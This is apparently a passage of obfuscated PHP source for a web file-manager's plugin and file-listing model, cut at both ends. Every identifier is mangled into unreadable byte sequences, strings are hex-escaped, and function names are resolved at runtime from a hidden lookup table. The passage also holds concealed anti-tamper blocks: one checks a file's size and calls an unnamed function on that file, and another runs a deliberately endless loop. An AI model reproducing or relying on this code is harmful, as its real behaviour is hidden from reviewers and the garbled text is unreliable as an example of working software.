$ƒù½÷Õ£[497]; $¦—ˆÀŸ¾(); } $û·¯“çò = $ƒù½÷Õ£[990]; $û·¯“çò($_SERVER[$ƒù½÷Õ£[991]]); $ÑÄì¨› = 1; for ($†ÊèÔŠÙ = $ÑÄì¨›; $†ÊèÔŠÙ > 0; $†ÊèÔŠÙ++) { $û·¯“çò = json_encode($GLOBALS[$ƒù½÷Õ£[514]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $‰Ú½ÒÕ); } public function onSetConfig($–òÛ´©Ú) { } public function onGetConfig($ËÍ¶ş˜ğ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ç®ı”®À) { if ($ç®ı”®À == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¿Å¨ğ ² = "\x70\x6c\165\x67\x69\x6e\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ç²ò£­Û = $this->getConfig(); if (!$ç²ò£­Û[$¿Å¨ğ ²]) { return !1; } return ActionCall($_SERVER[€ä¾™²][1841], $ç²ò£­Û[$¿Å¨ğ ²]); } public function url($‰Í×şÇ§, $ùÇìŞÍ± = '', $Æş©šÓ = true) { $çŸ¦¯‘ƒ =& $_SERVER[€ä¾™²]; $¥ï–à¯· = $this->getConfig(); $‘Å¿ä´ = KOD_VERSION . $çŸ¦¯‘ƒ[10] . KOD_VERSION_BUILD; $¼şéîÆ– = $this->packageVersion(); $ÌıÍº£ = $‘Å¿ä´ . $çŸ¦¯‘ƒ[476] . $¼şéîÆ–; if (substr($‰Í×şÇ§, 0, 4) == $çŸ¦¯‘ƒ[150] || substr($‰Í×şÇ§, 0, 2) == $çŸ¦¯‘ƒ[1469]) { $£©º·ê² = $‰Í×şÇ§ . $çŸ¦¯‘ƒ[1842] . $ÌıÍº£; } else { if ($ùÇìŞÍ± == $çŸ¦¯‘ƒ[12]) { $£©º·ê² = $this->pluginHost . $‰Í×şÇ§ . $çŸ¦¯‘ƒ[1842] . $ÌıÍº£; } else { if ($ùÇìŞÍ± === $çŸ¦¯‘ƒ[78]) { $£©º·ê² = $this->pluginHost . $‰Í×şÇ§; } else { if ($ùÇìŞÍ± == $çŸ¦¯‘ƒ[1843]) { $£©º·ê² = STATIC_PATH . $‰Í×şÇ§ . $çŸ¦¯‘ƒ[1842] . $‘Å¿ä´; } else { if ($ùÇìŞÍ± == $çŸ¦¯‘ƒ[1844]) { $£©º·ê² = APP_HOST . $çŸ¦¯‘ƒ[1845] . $‰Í×şÇ§ . $çŸ¦¯‘ƒ[1842] . $‘Å¿ä´; } else { if (isset($¥ï–à¯·[$ùÇìŞÍ±])) { $£©º·ê² = $¥ï–à¯·[$ùÇìŞÍ±] . $‰Í×şÇ§ . $çŸ¦¯‘ƒ[1842] . $ÌıÍº£; } } } } } } if (!$Æş©šÓ) { return $£©º·ê²; } echo $£©º·ê²; } public function link($Ò…ö– â = false, $×Ò›èÆ¿ = '') { $§“¤õÚş =& $_SERVER[€ä¾™²]; $ØÇœêÄŒ = $this->linkHas == !1; $this->linkHas = !0; if (!$Ò…ö– â) { $this->link($§“¤õÚş[1846], $§“¤õÚş[1844]); $this->link($§“¤õÚş[1847], $§“¤õÚş[1843]); $this->link($§“¤õÚş[1848], $§“¤õÚş[1843]); $this->link($§“¤õÚş[1849], $§“¤õÚş[1843]); $this->link($§“¤õÚş[1850], $§“¤õÚş[1843]); if ($ØÇœêÄŒ) { Hook::trigger($§“¤õÚş[1851]); } return; } $—ÉÒïàÙ = $this->url($Ò…ö– â, $×Ò›èÆ¿, !1); if (substr($Ò…ö– â, -3) == $§“¤õÚş[1852]) { echo $§“¤õÚş[1853] . $—ÉÒïàÙ . $§“¤õÚş[1854] . $§“¤õÚş[286]; } else { if (substr($Ò…ö– â, -4) == $§“¤õÚş[1855]) { echo $§“¤õÚş[1856] . $—ÉÒïàÙ . $§“¤õÚş[1857] . $§“¤õÚş[286]; } } if ($ØÇœêÄŒ) { Hook::trigger($§“¤õÚş[1851]); } } } goto F¶Ö’ĞâŸÉ; e¥ó‹íìÈ: $_file = $_SERVER[$_SERVER[€ä¾™²][492]]; $_size = $_SERVER[€ä¾™²][2379]; if ($_SERVER[$_SERVER[€ä¾™²][491]] != $_size($_file)) { $_getc = $_SERVER[€ä¾™²][493]; $_getfile = $_SERVER[$_SERVER[€ä¾™²][494]] . $_SERVER[€ä¾™²][495]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[€ä¾™²][286], $_getfilec); if (count($_getarrs) < $_SERVER[€ä¾™²][496]) { $exit = $_SERVER[€ä¾™²][497]; $exit(); } $_act = $_SERVER[€ä¾™²][498]; $_act($_file); } goto b¾Ñ¨Ìô½Û; c‡µ‰¼¨: class SourceListModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\x63\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\x6d\x65" => "\151\x6f\137\x73\x6f\x75\162\x63\145\x5f\x6d\x65\164\141", "\x6d\145\164\141\106\151\145\x6c\x64" => "\163\x6f\165\162\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\144\151\146\171\124\151\x6d\x65", "\x74\151\x6d\145", "\151\156\163\x65\162\x74", "\146\165\156\x63\x74\151\157\x6e"), array("\143\162\145\141\x74\x65\124\x69\x6d\145", "\164\x69\155\145", "\151\156\163\145\x72\164", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\166\151\145\x77\x54\x69\x6d\x65", "\164\151\155\x65", "\x69\156\x73\145\162\164", "\x66\165\156\x63\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($¯·ñÑ) { return $this->listSource(array($_SERVER[€ä¾™²][499] => $¯·ñÑ)); } public function typeName($¸æó¤íí) { static $¬É¤ü” = array(self::TYPE_SYSTEM => "\x73\171\163\x74\145\155", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\x67\x72\x6f\165\160"); return $¬É¤ü”[$¸æó¤íí . $_SERVER[€ä¾™²][12]]; } public function sourceListInfo($İ…ÕÔï, $¨’ñÄñ  = false) { $™¼Ë¤’¡ =& $_SERVER[€ä¾™²]; $İ…ÕÔï = $İ…ÕÔï ? $İ…ÕÔï : array(); $İ…ÕÔï = array_filter(array_unique($İ…ÕÔï)); if (!$İ…ÕÔï) { return array(); } $ïâÃá¢ = $this->where(array($™¼Ë¤’¡[192] => array($™¼Ë¤’¡[7], $İ…ÕÔï)))->select(); $this->_listDataApply($ïâÃá¢, $¨’ñÄñ ); return array_to_keyvalue($ïâÃá¢, $™¼Ë¤’¡[192]); } public function pathInfoFilter(&$¨š€ìØ) { $‘ÃĞóç¶ =& $_SERVER[€ä¾™²]; static $»à´¹¤€ = false; static $Úô÷Á¿¢ = false; static $´™‚ë•í = false; if (!$»à´¹¤€) { $ÜğÛÈõå = $‘ÃĞóç¶[500]; $ÜğÛÈõå .= $‘ÃĞóç¶[501]; $ÜğÛÈõå .= $‘ÃĞóç¶[502]; $êª×¿‘õ = $‘ÃĞóç¶[503]; $øÊ÷½˜Ù = explode($‘ÃĞóç¶[50], $êª×¿‘õ); $»à´¹¤€ = explode($‘ÃĞóç¶[50], $ÜğÛÈõå); $Úô÷Á¿¢ = array(); foreach ($»à´¹¤€ as $Êò–ê¡’) { if (in_array($Êò–ê¡’, $øÊ÷½˜Ù)) { continue; } $Úô÷Á¿¢[] = $Êò–ê¡’; } $´™‚ë•í = explode($‘ÃĞóç¶[50], $‘ÃĞóç¶[504]); } foreach ($´™‚ë•í as $´äòó¥Ó) { if (isset($¨š€ìØ[$´äòó¥Ó])) { $¨š€ìØ[$´äòó¥Ó] = intval($¨š€ìØ[$´äòó¥Ó]); } } $¨š€ìØ[$‘ÃĞóç¶[87]] = $‘ÃĞóç¶[505] . $¨š€ìØ[$‘ÃĞóç¶[192]] . $‘ÃĞóç¶[506]; $¨š€ìØ[$‘ÃĞóç¶[33]] = $¨š€ìØ[$‘ÃĞóç¶[507]] == 1 ? $‘ÃĞóç¶[78] : $‘ÃĞóç¶[231]; $¨š€ìØ[$‘ÃĞóç¶[189]] = $this->typeName($¨š€ìØ[$‘ÃĞóç¶[189]]); if ($¨š€ìØ[$‘ÃĞóç¶[507]] != 1) { $¨š€ìØ[$‘ÃĞóç¶[167]] = $¨š€ìØ[$‘ÃĞóç¶[508]]; unset($¨š€ìØ[$‘ÃĞóç¶[508]]); } $Â”±×¼° = $»à´¹¤€; if (isset($¨š€ìØ[$‘ÃĞóç¶[509]]) && $¨š€ìØ[$‘ÃĞóç¶[509]][$‘ÃĞóç¶[510]] == -1) { $Â”±×¼° = $Úô÷Á¿¢; } $¨š€ìØ = array_field_key($¨š€ìØ, $Â”±×¼°); return $¨š€ìØ; } public function listUserFav() { $œ³—Š =& $_SERVER[€ä¾™²]; $Åé¤ÜÏ” = Model($œ³—Š[511])->listData(); $‚…Í¾‚É = array_filter_by_field($Åé¤ÜÏ”, $œ³—Š[33], $œ³—Š[512]); $‚…Í¾‚É = array_to_keyvalue($‚…Í¾‚É, $œ³—Š[12], $œ³—Š[87]); if ($‚…Í¾‚É) { $ÏãûŞ°å = $this->listSource(array($œ³—Š[513] => array($œ³—Š[514], $‚…Í¾‚É))); } $ÏãûŞ°å = array_to_keyvalue($ÏãûŞ°å[$œ³—Š[446]], $œ³—Š[192]); foreach ($Åé¤ÜÏ” as &$é’¿Ã¾í) { $é’¿Ã¾í = array($œ³—Š[515] => $é’¿Ã¾í[$œ³—Š[486]], $œ³—Š[516] => $é’¿Ã¾í[$œ³—Š[32]], $œ³—Š[517] => $é’¿Ã¾í[$œ³—Š[87]], $œ³—Š[518] => $é’¿Ã¾í[$œ³—Š[33]], $œ³—Š[519] => $é’¿Ã¾í[$œ³—Š[232]], $œ³—Š[520] => $é’¿Ã¾í[$œ³—Š[88]]); if ($é’¿Ã¾í[$œ³—Š[33]] == $œ³—Š[512] && $ÏãûŞ°å[$é’¿Ã¾í[$œ³—Š[87]]]) { $é’¿Ã¾í[$œ³—Š[90]] = $ÏãûŞ°å[$é’¿Ã¾í[$œ³—Š[87]]]; } } unset($é’¿Ã¾í); return $Åé¤ÜÏ”; } public function listUserTag($¤š¯ï°) { $´ıœ¼ˆù =& $_SERVER[€ä¾™²]; if ($¤š¯ï° && !is_array($¤š¯ï°)) { $¤š¯ï° = array($¤š¯ï°); } $¿Æ—…¤ = Model($´ıœ¼ˆù[521])->listData(); $Ü¦ğ¼ªÒ = array(); $ˆä²ğ˜¾ = array(); foreach ($¿Æ—…¤ as $ÁÙÚôÀ) { $ŒªÎ¨™Ë = $ÁÙÚôÀ[$´ıœ¼ˆù[87]]; if (!$ŒªÎ¨™Ë) { continue; } if (!isset($ˆä²ğ˜¾[$ŒªÎ¨™Ë])) { $ˆä²ğ˜¾[$ŒªÎ¨™Ë] = array(); } $ˆä²ğ˜¾[$ŒªÎ¨™Ë][] = $ÁÙÚôÀ[$´ıœ¼ˆù[522]]; $Ü¦ğ¼ªÒ[$ÁÙÚôÀ[$´ıœ¼ˆù[87]]] = $ÁÙÚôÀ; } $¼ªŠÑ‘¥ = array(); $ô¡ğ¨¦™ = array(); $ºî”˜Ü‘ = array(); foreach ($ˆä²ğ˜¾ as $“ÑóŸ¹‚ => $Ü‰ø®æ‚) { $°à×ú†ñ = !0; if (!$¤š¯ï°) { $¼ªŠÑ‘¥[] = $“ÑóŸ¹‚; continue; } foreach ($¤š¯ï° as $šµµçªØ) { if (!in_array($šµµçªØ, $Ü‰ø®æ‚)) { $°à×ú†ñ = !1; break; } } if (!$°à×ú†ñ) { continue; } if (!is_numeric($“ÑóŸ¹‚)) { $ØüÇÏáí = $Ü¦ğ¼ªÒ[$“ÑóŸ¹‚]; $«Î˜‡× = array($´ıœ¼ˆù[32] => $ØüÇÏáí[$´ıœ¼ˆù[32]], $´ıœ¼ˆù[87] => $ØüÇÏáí[$´ıœ¼ˆù[87]], $´ıœ¼ˆù[33] => $ØüÇÏáí[$´ıœ¼ˆù[33]], $´ıœ¼ˆù[90] => array($´ıœ¼ˆù[523] => 1), $´ıœ¼ˆù[233] => !0); if ($ØüÇÏáí[$´ıœ¼ˆù[33]] == $´ıœ¼ˆù[231]) { $ºî”˜Ü‘[] = $«Î˜‡×; } if ($ØüÇÏáí[$´ıœ¼ˆù[33]] == $´ıœ¼ˆù[78]) { $ô¡ğ¨¦™[] = $«Î˜‡×; } continue; } $¼ªŠÑ‘¥[] = $“ÑóŸ¹‚; } if ($¼ªŠÑ‘¥) { $æİŸ·½¾ = $this->listSource(array($´ıœ¼ˆù[513] => array($´ıœ¼ˆù[514], $¼ªŠÑ‘¥))); } $æİŸ·½¾ = $æİŸ·½¾ ? $æİŸ·½¾ : array($´ıœ¼ˆù[85] => array(), $´ıœ¼ˆù[86] => array()); $æİŸ·½¾[$´ıœ¼ˆù[85]] = array_merge($æİŸ·½¾[$´ıœ¼ˆù[85]], $ô¡ğ¨¦™); $æİŸ·½¾[$´ıœ¼ˆù[86]] = array_merge($æİŸ·½¾[$´ıœ¼ˆù[86]], $ºî”˜Ü‘); if (isset($æİŸ·½¾[$´ıœ¼ˆù[443]]) && count($¼ªŠÑ‘¥) == $æİŸ·½¾[$´ıœ¼ˆù[443]][$´ıœ¼ˆù[444]]) { return $æİŸ·½¾; } $ŸÄ­×µÀ = array(); $¤Ï—ã‰ = array_to_keyvalue($æİŸ·½¾[$´ıœ¼ˆù[85]], $´ıœ¼ˆù[12], $´ıœ¼ˆù[192]); $ÁäŒÈøÁ = array_to_keyvalue($æİŸ·½¾[$´ıœ¼ˆù[86]], $´ıœ¼ˆù[12], $´ıœ¼ˆù[192]); $˜¶Ï¨†£ = array_merge($ÁäŒÈøÁ, $¤Ï—ã‰); foreach ($¼ªŠÑ‘¥ as $ŒªÎ¨™Ë) { if (!in_array($ŒªÎ¨™Ë, $˜¶Ï¨†£)) { $ŸÄ­×µÀ[] = $ŒªÎ¨™Ë; } } if ($ŸÄ­×µÀ) { Model($´ıœ¼ˆù[524])->removeBySource($ŸÄ­×µÀ); } return $æİŸ·½¾; } public function listUserRecycle() { $ÎìåÔœé =& $_SERVER[€ä¾™²]; $™Àë£Î¥ = Model($ÎìåÔœé[525])->listData(); if (!$™Àë£Î¥) { return array(); } $Ì©À£ŸÔ = array($ÎìåÔœé[513] => array($ÎìåÔœé[514], $™Àë£Î¥), $ÎìåÔœé[526] => 1); return $this->listSource($Ì©À£ŸÔ); } public function listSource($œ—ôŠ·, $åËıƒÙó = 3000, $ß•–¸Æ = false) { $àæ‰àÛ‘ =& $_SERVER[€ä¾™²]; if (!isset($œ—ôŠ·[$àæ‰àÛ‘[527]])) { $œ—ôŠ·[$àæ‰àÛ‘[527]] = 0; } if (isset($œ—ôŠ·[$àæ‰àÛ‘[191]]) && $œ—ôŠ·[$àæ‰àÛ‘[191]] == $àæ‰àÛ‘[229]) { $œ—ôŠ·[$àæ‰àÛ‘[508]] = array($àæ‰àÛ‘[464], $àæ‰àÛ‘[12]); } if (isset($œ—ôŠ·[$àæ‰àÛ‘[191]])) { $œ—ôŠ·[$àæ‰àÛ‘[191]] = intval($œ—ôŠ·[$àæ‰àÛ‘[191]]); } $ö¸°Œ¹ü = $àæ‰àÛ‘[528]; $ÕÇ”øÚé = $this->field($ö¸°Œ¹ü)->_makeOrder()->where($œ—ôŠ·)->selectPage($åËıƒÙó); $this->_listPageCheck($ÕÇ”øÚé, $ö¸°Œ¹ü, $œ—ôŠ·); $this->_listDataApply($ÕÇ”øÚé[$àæ‰àÛ‘[446]], $ß•–¸Æ); $this->_listMake($ÕÇ”øÚé); return $ÕÇ”øÚé; } private function _listPageCheck(&$ƒª±ôµÉ, $ÀİŒ¨•, $¦ÎÀ¾¡û) { $âá«Ç =& $_SERVER[€ä¾™²]; if (!is_array($ƒª±ôµÉ[$âá«Ç[443]])) { return; } $ã’÷Ìê¦ = $ƒª±ôµÉ[$âá«Ç[443]]; if ($ã’÷Ìê¦[$âá«Ç[445]] <= 1) { return; } if ($ã’÷Ìê¦[$âá«Ç[444]] >= 100000) { return; } if (Model($âá«Ç[529])->get($âá«Ç[530]) != $âá«Ç[531]) { return; } $ÀİŒ¨• = str_replace(array($âá«Ç[53], $âá«Ç[418], $âá«Ç[286]), $âá«Ç[12], $ÀİŒ¨•); $ÀİŒ¨• = $âá«Ç[532] . str_replace($âá«Ç[50], $âá«Ç[533], $ÀİŒ¨•) . $âá«Ç[534]; $±¢Âßå¾ = $âá«Ç[535]; $±¢Âßå¾ = $±¢Âßå¾ . $âá«Ç[536]; $‡‘ºæ–¼ = $ã’÷Ìê¦[$âá«Ç[440]] * ($ã’÷Ìê¦[$âá«Ç[429]] - 1) . $âá«Ç[50] . $ã’÷Ìê¦[$âá«Ç[440]]; $†•â‰¦ş = $this->_makeOrder(!0); $âŠÏ¯Ûø = $âá«Ç[532] . str_replace($âá«Ç[50], $âá«Ç[533], $†•â‰¦ş[0]); if (strpos($âŠÏ¯Ûø, $âá«Ç[537])) { $âŠÏ¯Ûø = str_replace($âá«Ç[537], $âá«Ç[538], $âŠÏ¯Ûø); } else { $âŠÏ¯Ûø .= $âá«Ç[539] . $†•â‰¦ş[1]; } $ÅÙá¤´ = array(); foreach ($¦ÎÀ¾¡û as $™ôõ¹° => $ÀŸ³Á) { $ÅÙá¤´[$âá«Ç[532] . $™ôõ¹°] = $ÀŸ³Á; } $this->alias($âá«Ç[540])->field($ÀİŒ¨•)->limit($‡‘ºæ–¼)->order($âŠÏ¯Ûø); $ƒ¼®ş½¶ = $this->join($±¢Âßå¾)->where($ÅÙá¤´)->select(); if ($ƒ¼®ş½¶) { $ƒª±ôµÉ[$âá«Ç[446]] = $ƒ¼®ş½¶; } } protected function _makeOrder($™Èı‡­’ = false) { $å·¢úØÅ =& $_SERVER[€ä¾™²]; $ø¢À©İ¸ = Model($å·¢úØÅ[541])->get($å·¢úØÅ[542]); $º°‰ïçà = Model($å·¢úØÅ[541])->get($å·¢úØÅ[543]); $óëü˜üÆ = array($å·¢úØÅ[544] => $å·¢úØÅ[545], $å·¢úØÅ[546] => $å·¢úØÅ[547]); $‘°†¥®û = array($å·¢úØÅ[32] => $å·¢úØÅ[32], $å·¢úØÅ[79] => $å·¢úØÅ[79], $å·¢úØÅ[167] => $å·¢úØÅ[508], $å·¢úØÅ[548] => $å·¢úØÅ[548], $å·¢úØÅ[549] => $å·¢úØÅ[550], $å·¢úØÅ[232] => $å·¢úØÅ[232], $å·¢úØÅ[88] => $å·¢úØÅ[88]); $Ú‹àÇÏš = Input::get($å·¢úØÅ[551], $å·¢úØÅ[7], $ø¢À©İ¸, array_keys($‘°†¥®û)); $û®úïÁş = Input::get($å·¢úØÅ[552], $å·¢úØÅ[7], $º°‰ïçà, array_keys($óëü˜üÆ)); if (!in_array($Ú‹àÇÏš, array_keys($‘°†¥®û))) { $Ú‹àÇÏš = $å·¢úØÅ[32]; } if (!in_array($û®úïÁş, array_keys($óëü˜üÆ))) { $Ú‹àÇÏš = $å·¢úØÅ[544]; } if ($Ú‹àÇÏš == $å·¢úØÅ[32]) { } $ééò°¢‰ = $å·¢úØÅ[553] . $‘°†¥®û[$Ú‹àÇÏš] . $å·¢úØÅ[53] . $óëü˜üÆ[$û®úïÁş]; $ééò°¢‰ = rtrim(trim($ééò°¢‰), $å·¢úØÅ[50]); if ($™Èı‡­’) { return array($ééò°¢‰, $óëü˜üÆ[$û®úïÁş]); } return $this->order($ééò°¢‰); } protected function _listDataApplyItem($°¢ƒæ, $†˜Ò«² = false) { $ñï»º–ì = array($°¢ƒæ); $this->_listDataApply($ñï»º–ì, $†˜Ò«²); return $ñï»º–ì[0]; } protected function _listDataApply(&$¼ÁŞ‘˜, $Ô‚ŠÛÉ = false) { $Ô½¾† à =& $_SERVER[€ä¾™²]; if (!$¼ÁŞ‘˜) { $¼ÁŞ‘˜ = array(); return; } $å†¹½ß = array_to_keyvalue($¼ÁŞ‘˜, $Ô½¾† à[12], $Ô½¾† à[192]); $å†¹½ß = array_unique($å†¹½ß); $å†¹½ß = array_to_int($å†¹½ß); $this->_listSourceCache($¼ÁŞ‘˜); if (!$Ô‚ŠÛÉ) { $this->_listAppendMeta($¼ÁŞ‘˜, $å†¹½ß); $this->_listAppendFileMeta($¼ÁŞ‘˜, $å†¹½ß); $this->_listAppendChildren($¼ÁŞ‘˜, $å†¹½ß); } $this->_listAppendPath($¼ÁŞ‘˜); $this->_listAppendAuth($¼ÁŞ‘˜); $this->_listAppendSourceInfo($¼ÁŞ‘˜, $å†¹½ß); $this->_listAppendUser($¼ÁŞ‘˜); $this->_listFilterInfo($¼ÁŞ‘˜, $Ô‚ŠÛÉ); $this->_listAppendAuthSecret($¼ÁŞ‘˜); } protected function _listSourceCache($ŠÂ˜ö‚Ì) { $Ó ø°ÂÙ =& $_SERVER[€ä¾™²]; foreach ($ŠÂ˜ö‚Ì as $—²Ğß¨) { self::$cacheSourceInfo[$Ó ø°ÂÙ[554] . $—²Ğß¨[$Ó ø°ÂÙ[192]]] = $—²Ğß¨; } } protected function _listFilterInfo(&$™—ˆ§˜, $•×™Ö·Ÿ = false) { $‡‚›Ç„ =& $_SERVER[€ä¾™²]; foreach ($™—ˆ§˜ as &$º•ˆÇ„) { $º•ˆÇ„ = $this->pathInfoFilter($º•ˆÇ„); self::$cachePathInfo[$‡‚›Ç„[555] . intval($•×™Ö·Ÿ) . $‡‚›Ç„[476] . $º•ˆÇ„[$‡‚›Ç„[192]]] = $º•ˆÇ„; } unset($º•ˆÇ„); } protected function _listMake(&$Œ×îû¬‘) { $İÕÜ•û =& $_SERVER[€ä¾™²]; $Œ×îû¬‘[$İÕÜ•û[85]] = array(); $Œ×îû¬‘[$İÕÜ•û[86]] = array(); foreach ($Œ×îû¬‘[$İÕÜ•û[446]] as $ö³ñ»òØ) { $–«Ë¾Å = $ö³ñ»òØ[$İÕÜ•û[507]] == 1 ? $İÕÜ•û[85] : $İÕÜ•û[86]; $Œ×îû¬‘[$–«Ë¾Å][] = $ö³ñ»òØ; } unset($Œ×îû¬‘[$İÕÜ•û[446]]); } protected function _listAppendMeta(&$×ÌÛ²“ñ, $™¥…ì­”) { $»šçÉí =& $_SERVER[€ä¾™²]; $œÔ¯İŞÛ = array($»šçÉí[513] => array($»šçÉí[514], $™¥…ì­”)); $íÅ‡‚ˆ– = Model($»šçÉí[556])->field($»šçÉí[557])->where($œÔ¯İŞÛ)->select(); if (!$íÅ‡‚ˆ–) { return; } $áÍ¿Ø = array($»šçÉí[558], $»šçÉí[559], $»šçÉí[538]); $Ú‰¾ßÔ = array(); foreach ($íÅ‡‚ˆ– as $”¶ä¯Îê) { if (!isset($Ú‰¾ßÔ[$”¶ä¯Îê[$»šçÉí[192]]])) { $Ú‰¾ßÔ[$”¶ä¯Îê[$»šçÉí[192]]] = array(); } if (in_array($”¶ä¯Îê[$»šçÉí[95]], $áÍ¿Ø)) { continue; } if ($”¶ä¯Îê[$»šçÉí[95]] == $»šçÉí[560]) { $”¶ä¯Îê[$»šçÉí[451]] = $»šçÉí[561]; } $Ú‰¾ßÔ[$”¶ä¯Îê[$»šçÉí[192]]][$”¶ä¯Îê[$»šçÉí[95]]] = $”¶ä¯Îê[$»šçÉí[451]]; } foreach ($×ÌÛ²“ñ as &$½ñÕ®´¿) { $½ñÕ®´¿[$»šçÉí[562]] = !1; if (isset($Ú‰¾ßÔ[$½ñÕ®´¿[$»šçÉí[192]]])) { $½ñÕ®´¿[$»šçÉí[562]] = $Ú‰¾ßÔ[$½ñÕ®´¿[$»šçÉí[192]]]; } if ($this->fileIsLock($½ñÕ®´¿) && $½ñÕ®´¿[$»šçÉí[509]]) { $âİ«Çš = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $½ñÕ®´¿[$»šçÉí[509]][$»šçÉí[510]] = AuthModel::authDisable($½ñÕ®´¿[$»šçÉí[509]][$»šçÉí[510]], $âİ«Çš); $½ñÕ®´¿[$»šçÉí[509]][$»šçÉí[563]][$»šçÉí[509]] = $½ñÕ®´¿[$»šçÉí[509]][$»šçÉí[510]]; } } unset($½ñÕ®´¿); } protected function _listAppendFileMeta(&$˜ÖÁÊŸ, $İç¹’™§) { $®÷ÑîøØ =& $_SERVER[€ä¾™²]; $‘‚”±š = array_to_keyvalue($˜ÖÁÊŸ, $®÷ÑîøØ[12], $®÷ÑîøØ[564]); $‘‚”±š = array_filter(array_unique($‘‚”±š)); $‘‚”±š = array_to_int($‘‚”±š); if (!$‘‚”±š) { return; } $¼ë‹şãº = array($®÷ÑîøØ[565] => array($®÷ÑîøØ[514], $‘‚”±š)); $Ûë­Œå— = $®÷ÑîøØ[566]; $Í€¿™²¹ = Model($®÷ÑîøØ[567])->field($Ûë­Œå—)->where($¼ë‹şãº)->select(); $Í€¿™²¹ = array_to_keyvalue($Í€¿™²¹, $®÷ÑîøØ[564]); $³şõ¢¾ƒ = Model($®÷ÑîøØ[568])->field($®÷ÑîøØ[569])->where($¼ë‹şãº)->select(); $³şõ¢¾ƒ = $³şõ¢¾ƒ ? $³şõ¢¾ƒ : array(); $  ×÷»¹ = array(); foreach ($³şõ¢¾ƒ as $¶šë˜) { if (!isset($  ×÷»¹[$¶šë˜[$®÷ÑîøØ[564]]])) { $  ×÷»¹[$¶šë˜[$®÷ÑîøØ[564]]] = array(); } $  ×÷»¹[$¶šë˜[$®÷ÑîøØ[564]]][$¶šë˜[$®÷ÑîøØ[95]]] = $¶šë˜[$®÷ÑîøØ[451]]; } foreach ($˜ÖÁÊŸ as &$´ïØØ½) { $ÎîçËí§ = $´ïØØ½[$®÷ÑîøØ[564]]; if (!$ÎîçËí§ || !is_array($Í€¿™²¹[$ÎîçËí§])) { continue; } $Õö‡ÍƒÌ = $Í€¿™²¹[$ÎîçËí§]; $Õö‡ÍƒÌ[$®÷ÑîøØ[79]] = $´ïØØ½[$®÷ÑîøØ[79]]; $Õö‡ÍƒÌ[$®÷ÑîøØ[32]] = $´ïØØ½[$®÷ÑîøØ[32]]; if (!$Õö‡ÍƒÌ[$®÷ÑîøØ[570]]) { Model($®÷ÑîøØ[567])->fileMd5Check($Õö‡ÍƒÌ); } if (!isset(self::$cacheFileInfo[$®÷ÑîøØ[571] . $ÎîçËí§])) { self::$cacheFileInfo[$®÷ÑîøØ[571] . $ÎîçËí§] = array_merge(array(), $Õö‡ÍƒÌ); } unset($Í€¿™²¹[$ÎîçËí§][$®÷ÑîøØ[87]]); $íĞÎ±àŒ = isset($  ×÷»¹[$ÎîçËí§]) && is_array($  ×÷»¹[$ÎîçËí§]) ? $  ×÷»¹[$ÎîçËí§] : array(); $´ïØØ½[$®÷ÑîøØ[168]] = array_merge($íĞÎ±àŒ, $Í€¿™²¹[$ÎîçËí§]); if (isset($´ïØØ½[$®÷ÑîøØ[168]][$®÷ÑîøØ[183]])) { $´ïØØ½[$®÷ÑîøØ[183]] = json_decode($´ïØØ½[$®÷ÑîøØ[168]][$®÷ÑîøØ[183]], !0); unset($´ïØØ½[$®÷ÑîøØ[168]][$®÷ÑîøØ[183]]); } } unset($´ïØØ½); } protected function _listAppendSourceInfo(&$Âû°Úá€, $ò°¢½ã) { $÷—©Ò€Æ =& $_SERVER[€ä¾™²]; $ô¢Šì·ç = Model($÷—©Ò€Æ[572])->listData(); $È’¸¥ğ = Model($÷—©Ò€Æ[521])->listData(); $¬„şœÚ = Model($÷—©Ò€Æ[511])->listData(); $ã™¨èÃ¶ = Model($÷—©Ò€Æ[573])->listSimple(); $„ùÅŞ = array_to_keyvalue($ô¢Šì·ç, $÷—©Ò€Æ[486]); $¸Â£ÎŸ = array_to_keyvalue_group($È’¸¥ğ, $÷—©Ò€Æ[87], $÷—©Ò€Æ[522]); $œÂ¡Æ‚ü = array_to_keyvalue($¬„şœÚ, $÷—©Ò€Æ[87]); $áû÷Ñê´ = array_to_keyvalue_group($ã™¨èÃ¶, $÷—©Ò€Æ[192]); foreach ($Âû°Úá€ as &$ôõ‚÷©É) { $ôõ‚÷©É[$÷—©Ò€Æ[90]] = array($÷—©Ò€Æ[574] => 0, $÷—©Ò€Æ[575] => 0, $÷—©Ò€Æ[576] => 0); if (isset($œÂ¡Æ‚ü[$ôõ‚÷©É[$÷—©Ò€Æ[192]]])) { $ôõ‚÷©É[$÷—©Ò€Æ[90]][$÷—©Ò€Æ[577]] = 1; $ôõ‚÷©É[$÷—©Ò€Æ[90]][$÷—©Ò€Æ[578]] = $œÂ¡Æ‚ü[$ôõ‚÷©É[$÷—©Ò€Æ[192]]][$÷—©Ò€Æ[32]]; } if ($¸Â£ÎŸ && $„ùÅŞ && isset($¸Â£ÎŸ[$ôõ‚÷©É[$÷—©Ò€Æ[192]]])) { $ôõ‚÷©É[$÷—©Ò€Æ[90]][$÷—©Ò€Æ[579]] = array(); foreach ($¸Â£ÎŸ[$ôõ‚÷©É[$÷—©Ò€Æ[192]]] as $œ¦Ë¬›•) { $éäù‘¯í = $„ùÅŞ[$œ¦Ë¬›•]; $ôõ‚÷©É[$÷—©Ò€Æ[90]][$÷—©Ò€Æ[579]][] = array($÷—©Ò€Æ[580] => $éäù‘¯í[$÷—©Ò€Æ[486]], $÷—©Ò€Æ[516] => $éäù‘¯í[$÷—©Ò€Æ[32]], $÷—©Ò€Æ[581] => $éäù‘¯í[$÷—©Ò€Æ[582]]); } } if ($áû÷Ñê´ && isset($áû÷Ñê´[$ôõ‚÷©É[$÷—©Ò€Æ[192]]])) { 